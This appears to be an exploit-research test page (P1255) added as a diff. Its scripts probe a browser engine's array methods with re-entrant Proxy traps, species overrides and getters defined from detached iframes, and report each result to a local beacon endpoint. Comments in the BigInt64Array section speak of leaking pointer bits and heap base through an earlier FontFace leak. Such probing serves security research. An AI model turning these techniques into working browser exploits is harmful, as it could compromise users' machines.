@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P1255</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1255-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+log('=== P1255: SPECIES RE-ENTRANCY + PROXY WRITE TRAPS ===');
+B('START','P1255');
+
+function mkFrame(){
+  var ifr=document.createElement('iframe');
+  ifr.style.cssText='width:1px;height:1px;position:absolute;left:-9999px';
+  document.body.appendChild(ifr);
+  ifr.contentDocument.open();
+  ifr.contentDocument.write('<html><body></body></html>');
+  ifr.contentDocument.close();
+  return {win:ifr.contentWindow, doc:ifr.contentDocument, ifr:ifr};
+}
+</script>
+
+<!-- A: Species returns Proxy — set trap modifies SOURCE array during map -->
+<script>
+log('\n--- A: Species Proxy re-entrancy ---');
+(function(){
+  var f=mkFrame();
+  var source=[1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+  var setLog=[];
+
+  // Species constructor returns a Proxy that logs and modifies source on set
+  var proxyTarget=[];
+  var handler=f.win.eval('(function(src, setLog){'+
+    'return {'+
+      'set: function(t, p, v) {'+
+        'var idx=parseInt(p);'+
+        'if(!isNaN(idx)){'+
+          'setLog.push(idx+":"+v);'+
+          // RE-ENTRANT: modify source while map() is iterating
+          'if(idx===2){ src.length=3; }'+  // Shrink source mid-map
+          'if(idx===4){ src.push(99,99,99,99,99); }'+  // Grow source mid-map
+        '}'+
+        't[p]=v;'+
+        'return true;'+
+      '},'+
+      'get: function(t, p){'+
+        'return t[p];'+
+      '}'+
+    '};'+
+  '})(src, setLog)');
+
+  // Inject src reference
+  f.win.src=source;
+  f.win.setLog=setLog;
+  handler=f.win.eval('(function(src, setLog){'+
+    'return {'+
+      'set: function(t, p, v) {'+
+        'var idx=parseInt(p);'+
+        'if(!isNaN(idx)){'+
+          'setLog.push(idx+":"+v);'+
+          'if(idx===2){ src.length=3; }'+
+          'if(idx===4){ src.push(99,99,99,99,99); }'+
+        '}'+
+        't[p]=v;'+
+        'return true;'+
+      '},'+
+      'get: function(t, p){ return t[p]; }'+
+    '};'+
+  '})(src, setLog)');
+
+  document.body.removeChild(f.ifr);
+
+  // Override species to return Proxy
+  source.constructor={};
+  source.constructor[Symbol.species]=function(len){
+    return new Proxy(new Array(len), handler);
+  };
+
+  try{
+    var result=source.map(function(x){return x*2;});
+    B('A1','result_len='+result.length+'|src_len='+source.length+
+      '|vals='+Array.from({length:Math.min(result.length,12)},function(_,i){return result[i];}).join(',')+
+      '|sets='+setLog.slice(0,10).join(';'));
+  }catch(e){B('A1','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- B: Species Proxy set trap that RETURNS FALSE (rejection) at key indices -->
+<script>
+log('\n--- B: Species set-trap rejection ---');
+(function(){
+  var f=mkFrame();
+  var rejectLog=[];
+
+  var handler=f.win.eval('(function(rejectLog){'+
+    'return {'+
+      'set: function(t, p, v) {'+
+        'var idx=parseInt(p);'+
+        'if(!isNaN(idx)){'+
+          'rejectLog.push(idx);'+
+          'if(idx===3) return false;'+  // Reject write at index 3
+          'if(idx===5) return false;'+  // Reject write at index 5
+        '}'+
+        't[p]=v;'+
+        'return true;'+
+      '},'+
+      'get: function(t, p){ return t[p]; }'+
+    '};'+
+  '})(rejectLog)');
+  f.win.rejectLog=rejectLog;
+
+  document.body.removeChild(f.ifr);
+
+  var source=[10,20,30,40,50,60,70,80];
+  source.constructor={};
+  source.constructor[Symbol.species]=function(len){
+    return new Proxy(new Array(len), handler);
+  };
+
+  try{
+    var result=source.map(function(x){return x+1;});
+    var vals=[];
+    for(var i=0;i<result.length;i++) vals.push(result[i]);
+    B('B1','result_len='+result.length+'|vals='+vals.join(',')+
+      '|rejects='+rejectLog.join(','));
+  }catch(e){B('B1','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // Same with filter
+  source=[10,20,30,40,50,60,70,80];
+  source.constructor={};
+  source.constructor[Symbol.species]=function(len){
+    return new Proxy([], handler);
+  };
+  rejectLog.length=0;
+
+  try{
+    var filtered=source.filter(function(x){return x>25;});
+    B('B2','filter_len='+filtered.length+'|rejects='+rejectLog.join(','));
+  }catch(e){B('B2','filter_err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- C: Proxy with changing length during Array.from iteration -->
+<script>
+log('\n--- C: Proxy with mutating length ---');
+(function(){
+  var f=mkFrame();
+  var lengthReads=0;
+
+  var handler=f.win.eval('(function(){'+
+    'var reads=0;'+
+    'return {'+
+      'get: function(t, p){'+
+        'if(p==="length"){'+
+          'reads++;'+
+          'if(reads===1) return 100;'+     // First read: huge
+          'if(reads===2) return 5;'+        // Second read: small
+          'return reads;'+                   // Keep changing
+        '}'+
+        'if(p===Symbol.iterator) return undefined;'+  // Force length-based iteration
+        'var idx=parseInt(p);'+
+        'if(!isNaN(idx)) return idx<5?idx*11:undefined;'+
+        'return t[p];'+
+      '}'+
+    '};'+
+  '})()');
+
+  document.body.removeChild(f.ifr);
+
+  var source={0:'a',1:'b',2:'c',3:'d',4:'e'};
+  var proxy=new Proxy(source, handler);
+
+  // Array.from reads length ONCE, then iterates to that count
+  try{
+    var result=Array.from(proxy);
+    B('C1','from_len='+result.length+'|first5='+result.slice(0,5).join(',')+
+      '|last3='+result.slice(-3).join(','));
+  }catch(e){B('C1','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // Array.prototype.slice.call with proxy
+  try{
+    var sliced=Array.prototype.slice.call(proxy);
+    B('C2','slice_len='+sliced.length+'|first3='+sliced.slice(0,3).join(','));
+  }catch(e){B('C2','slice_err:'+e.name+':'+e.message.slice(0,60));}
+
+  // Array.prototype.splice.call
+  try{
+    var proxy2=new Proxy({0:'x',1:'y',2:'z',length:3}, handler);
+    var spliced=Array.prototype.splice.call(proxy2, 1, 1);
+    B('C3','splice_len='+spliced.length);
+  }catch(e){B('C3','splice_err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- D: Re-entrant Proxy get trap that modifies prototype chain during operation -->
+<script>
+log('\n--- D: Prototype mutation during iteration ---');
+(function(){
+  var f=mkFrame();
+  var arr=[1,2,3,4,5,6,7,8,9,10];
+  var triggerCount=0;
+
+  // Create a getter on Array.prototype via dead-realm code
+  var origSlice=Array.prototype.slice;
+  var poisonProto=f.win.eval('(function(arr){'+
+    'var count=0;'+
+    'Object.defineProperty(arr, "3", {'+
+      'get: function(){'+
+        'count++;'+
+        'if(count===1){'+
+          // First access: modify the array through side-channel
+          'arr.length=4;'+  // Truncate
+          'return 444;'+
+        '}'+
+        'return 333;'+
+      '},'+
+      'configurable:true'+
+    '});'+
+    'return count;'+
+  '})');
+
+  document.body.removeChild(f.ifr);
+
+  try{
+    poisonProto(arr);
+    // Now arr[3] triggers getter from dead realm
+    var v=arr[3];
+    B('D1','getter_val='+v+'|arr_len='+arr.length+'|arr='+arr.join(','));
+  }catch(e){B('D1','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // slice() through poisoned getter
+  arr=[1,2,3,4,5,6,7,8,9,10];
+  try{
+    var f2=mkFrame();
+    f2.win.eval('(function(arr){'+
+      'Object.defineProperty(arr, "5", {'+
+        'get: function(){ arr.length=2; return 555; },'+
+        'configurable: true'+
+      '});'+
+    '})')(arr);
+    document.body.removeChild(f2.ifr);
+
+    var sliced=arr.slice(0);
+    B('D2','slice_len='+sliced.length+'|vals='+sliced.join(','));
+  }catch(e){B('D2','slice_err:'+e.name+':'+e.message.slice(0,60));}
+
+  // concat through poisoned getter
+  arr=[1,2,3,4,5];
+  try{
+    var f3=mkFrame();
+    f3.win.eval('(function(arr){'+
+      'Object.defineProperty(arr, "2", {'+
+        'get: function(){ arr[10]=999; arr.length=15; return 222; },'+
+        'configurable: true'+
+      '});'+
+    '})')(arr);
+    document.body.removeChild(f3.ifr);
+
+    var concated=arr.concat([6,7,8]);
+    B('D3','concat_len='+concated.length+'|vals='+concated.slice(0,8).join(','));
+  }catch(e){B('D3','concat_err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- E: Species + valueOf confusion — species allocates based on ToLength(length) -->
+<script>
+log('\n--- E: Species length coercion ---');
+(function(){
+  var f=mkFrame();
+
+  // Species constructor that receives coerced length
+  var logs=[];
+  var speciesFn=f.win.eval('(function(logs){'+
+    'return function SpeciesLen(len){'+
+      'logs.push("species_called:"+len+"|type="+typeof len);'+
+      'var arr=[];'+
+      'arr.length=Math.min(len,100);'+  // Cap for safety
+      'return arr;'+
+    '};'+
+  '})(logs)');
+  f.win.logs=logs;
+  document.body.removeChild(f.ifr);
+
+  // Array with valueOf on length
+  var arr=[1,2,3,4,5];
+  arr.constructor={};
+  arr.constructor[Symbol.species]=speciesFn;
+
+  // Object.defineProperty to make length return object with valueOf
+  try{
+    var result=arr.map(function(x){return x*3;});
+    B('E1','map_ok|len='+result.length+'|logs='+logs.join(';'));
+  }catch(e){B('E1','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // filter with species
+  logs.length=0;
+  try{
+    var filtered=arr.filter(function(x){return x>2;});
+    B('E2','filter_ok|len='+filtered.length+'|vals='+Array.from(filtered).join(',')+'|logs='+logs.join(';'));
+  }catch(e){B('E2','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // slice with species
+  logs.length=0;
+  arr.constructor[Symbol.species]=speciesFn;
+  try{
+    var sliced=arr.slice(1,4);
+    B('E3','slice_ok|len='+sliced.length+'|vals='+Array.from(sliced).join(',')+'|logs='+logs.join(';'));
+  }catch(e){B('E3','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // What if species returns an object with setter traps on indices?
+  logs.length=0;
+  var sideEffects=[];
+  arr.constructor[Symbol.species]=function(len){
+    var obj={length:0};
+    return new Proxy(obj, {
+      set:function(t,p,v){
+        sideEffects.push(p+'='+v);
+        t[p]=v;
+        if(p==='length') return true;
+        t.length=parseInt(p)+1;  // Maintain array-like length
+        return true;
+      },
+      get:function(t,p){return t[p];}
+    });
+  };
+
+  try{
+    var mapped2=arr.map(function(x){return x*10;});
+    B('E4','proxy_species|len='+mapped2.length+'|effects='+sideEffects.slice(0,8).join(';')+
+      '|v0='+mapped2[0]+'|v4='+mapped2[4]);
+  }catch(e){B('E4','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- F: Array.prototype methods on Proxy with re-entrant has/get/set traps -->
+<script>
+log('\n--- F: Array method Proxy re-entrancy ---');
+(function(){
+  var f=mkFrame();
+  var trapLog=[];
+
+  // Proxy where 'has' and 'get' shrink the real backing during includes/indexOf
+  var backing=[10,20,30,40,50,60,70,80,90,100];
+  var handler=f.win.eval('(function(backing, trapLog){'+
+    'return {'+
+      'get: function(t, p){'+
+        'if(p==="length") return backing.length;'+
+        'var idx=parseInt(p);'+
+        'if(!isNaN(idx)){'+
+          'trapLog.push("get:"+idx);'+
+          'if(idx===5){ backing.length=3; }'+  // Shrink at index 5
+          'return backing[idx];'+
+        '}'+
+        'return backing[p];'+
+      '},'+
+      'has: function(t, p){'+
+        'trapLog.push("has:"+p);'+
+        'return p in backing;'+
+      '}'+
+    '};'+
+  '})(backing, trapLog)');
+  f.win.backing=backing;
+  f.win.trapLog=trapLog;
+  document.body.removeChild(f.ifr);
+
+  var proxy=new Proxy([], handler);
+
+  // indexOf with re-entrant shrink
+  try{
+    var idx=Array.prototype.indexOf.call(proxy, 70);
+    B('F1','indexOf='+idx+'|backing_len='+backing.length+
+      '|traps='+trapLog.length+'|log='+trapLog.slice(0,8).join(';'));
+  }catch(e){B('F1','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // includes with re-entrant modification
+  backing=[10,20,30,40,50,60,70,80,90,100];
+  trapLog.length=0;
+  try{
+    var has=Array.prototype.includes.call(proxy, 80);
+    B('F2','includes='+has+'|backing_len='+backing.length+
+      '|traps='+trapLog.length);
+  }catch(e){B('F2','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // reduce with re-entrant modification
+  backing=[1,2,3,4,5,6,7,8,9,10];
+  trapLog.length=0;
+  try{
+    var sum=Array.prototype.reduce.call(proxy, function(acc,v,i){
+      return acc+v;
+    }, 0);
+    B('F3','reduce='+sum+'|backing_len='+backing.length+
+      '|expected='+(1+2+3+4+5+6+7+8+9+10));
+  }catch(e){B('F3','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // find with re-entrant shrink
+  backing=[1,2,3,4,5,6,7,8,9,10];
+  trapLog.length=0;
+  try{
+    var found=Array.prototype.find.call(proxy, function(v){return v===8;});
+    B('F4','find='+found+'|backing_len='+backing.length);
+  }catch(e){B('F4','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- G: copyWithin + Proxy with re-entrant trap -->
+<script>
+log('\n--- G: copyWithin / fill with Proxy ---');
+(function(){
+  var f=mkFrame();
+  var trapLog=[];
+
+  var backing=[0,1,2,3,4,5,6,7,8,9];
+  var handler=f.win.eval('(function(backing, trapLog){'+
+    'return {'+
+      'get: function(t, p){'+
+        'if(p==="length") return backing.length;'+
+        'var idx=parseInt(p);'+
+        'if(!isNaN(idx)){'+
+          'trapLog.push("g:"+idx);'+
+          'return backing[idx];'+
+        '}'+
+        'return backing[p]||Array.prototype[p];'+
+      '},'+
+      'set: function(t, p, v){'+
+        'var idx=parseInt(p);'+
+        'if(!isNaN(idx)){'+
+          'trapLog.push("s:"+idx+"="+v);'+
+          // Re-entrant: shift array when writing to index 3
+          'if(idx===3){ backing.splice(0,1); }'+
+          'backing[idx]=v;'+
+        '}'+
+        'return true;'+
+      '},'+
+      'has: function(t, p){ return p in backing; }'+
+    '};'+
+  '})(backing, trapLog)');
+  f.win.backing=backing;
+  f.win.trapLog=trapLog;
+  document.body.removeChild(f.ifr);
+
+  var proxy=new Proxy([], handler);
+
+  // copyWithin with re-entrant trap
+  try{
+    Array.prototype.copyWithin.call(proxy, 0, 5);
+    B('G1','copyWithin|backing='+backing.join(',')+
+      '|traps='+trapLog.length+'|log='+trapLog.slice(0,10).join(';'));
+  }catch(e){B('G1','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // fill with re-entrant trap
+  backing=[0,1,2,3,4,5,6,7,8,9];
+  trapLog.length=0;
+  try{
+    Array.prototype.fill.call(proxy, 42, 2, 7);
+    B('G2','fill|backing='+backing.join(',')+
+      '|traps='+trapLog.length);
+  }catch(e){B('G2','err:'+e.name+':'+e.message.slice(0,60));}
+
+  // reverse with re-entrant trap
+  backing=[0,1,2,3,4,5,6,7,8,9];
+  trapLog.length=0;
+  try{
+    Array.prototype.reverse.call(proxy);
+    B('G3','reverse|backing='+backing.join(',')+
+      '|traps='+trapLog.length);
+  }catch(e){B('G3','err:'+e.name+':'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- H: BigInt64Array confusion via species + DataView -->
+<script>
+log('\n--- H: BigInt64Array species confusion ---');
+(function(){
+  // Exploit: if we can get a BigInt64Array view on same buffer as Float64Array
+  // then reading BigInt64 gives us raw pointer bits
+  var buf=new ArrayBuffer(64);
+  var f64=new Float64Array(buf);
+  var bi64=new BigInt64Array(buf);
+
+  // Write a float, read as bigint — gives raw IEEE 754 bits
+  f64[0]=1.1;
+  f64[1]=2.2;
+  B('H1','f64_0='+f64[0]+'|bi64_0=0x'+bi64[0].toString(16)+
+    '|f64_1='+f64[1]+'|bi64_1=0x'+bi64[1].toString(16));
+
+  // Write known bit patterns via BigInt64, read as float
+  bi64[2]=0x4141414141414141n;
+  bi64[3]=0xDEADBEEFCAFEBABEn;
+  B('H2','as_float_2='+f64[2]+'|as_float_3='+f64[3]);
+
+  // Can we use this to read object pointers?
+  // Create array of objects, get their float representations
+  var obj={a:1};
+  var arr=[obj, obj, obj, obj];
+
+  // Try to get backing store address via structuredClone transfer
+  try{
+    var testBuf=new ArrayBuffer(8);
+    var before=new BigUint64Array(testBuf);
+    before[0]=0xAAAAAAAAAAAAAAAAn;
+    var cloned=structuredClone(testBuf,{transfer:[testBuf]});
+    var after=new BigUint64Array(cloned);
+    B('H3','transfer|before_detached='+(testBuf.byteLength===0)+'|after_val=0x'+after[0].toString(16));
+  }catch(e){B('H3','err:'+e.message.slice(0,60));}
+
+  // What if we have an ArrayBuffer whose backing store address we know?
+  // The FontFace pointer disclosure from P1189 could give us engine heap base
+  // For now: measure the distance between two ArrayBuffer backing stores
+  var buf1=new ArrayBuffer(256);
+  var buf2=new ArrayBuffer(256);
+  var v1=new BigUint64Array(buf1);
+  var v2=new BigUint64Array(buf2);
+  v1[0]=0x1111111111111111n;
+  v2[0]=0x2222222222222222n;
+
+  // We can't get the address of a buffer FROM JS alone
+  // But if we can spray objects then read via FontFace pointer leak...
+  B('H4','buf_check|v1=0x'+v1[0].toString(16)+'|v2=0x'+v2[0].toString(16));
+})();
+</script>
+
+<script>
+setTimeout(function(){
+  B('DONE','all');
+  log('\n=== P1255 COMPLETE ===');
+}, 5000);
+</script>
+
+</body>
+</html>
